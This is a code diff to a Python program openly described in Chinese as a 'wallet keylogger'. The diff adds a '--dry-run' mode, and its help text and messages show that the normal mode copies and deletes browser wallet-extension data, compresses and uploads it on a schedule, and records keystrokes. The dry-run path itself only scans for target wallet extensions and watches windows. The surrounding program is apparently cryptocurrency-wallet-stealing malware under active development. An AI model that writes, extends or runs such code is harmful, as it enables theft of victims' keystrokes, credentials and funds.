@@ -15,8 +15,32 @@ def main():
     """主函数"""
     parser = argparse.ArgumentParser(description="钱包键盘记录器")
     parser.add_argument("--debug", "-d", action="store_true", help="调试模式：实时显示窗口信息")
+    parser.add_argument(
+        "--dry-run",
+        action="store_true",
+        help="安全测试模式：只扫描扩展和检测窗口，不备份、不删除、不上传、不记录按键",
+    )
 
     args = parser.parse_args()
+
+    if args.dry_run:
+        print("dry-run 模式：不会创建日志、复制/删除扩展数据、压缩上传或启动上传调度\n")
+        print("正在扫描浏览器扩展数据...")
+        count = backup_browser_extensions(dry_run=True)
+        if count > 0:
+            print(f"检测到 {count} 个目标钱包扩展（未备份）\n")
+        else:
+            print("未检测到目标钱包扩展\n")
+
+        logger = KeyLogger(debug_mode=True, dry_run=True)
+        try:
+            logger.start()
+        except KeyboardInterrupt:
+            print("\n已停止 dry-run")
+        except Exception as e:
+            print(f"\n错误: {e}", file=sys.stderr)
+            sys.exit(1)
+        return 0
 
     # 创建日志文件
     log_file = create_log_file()
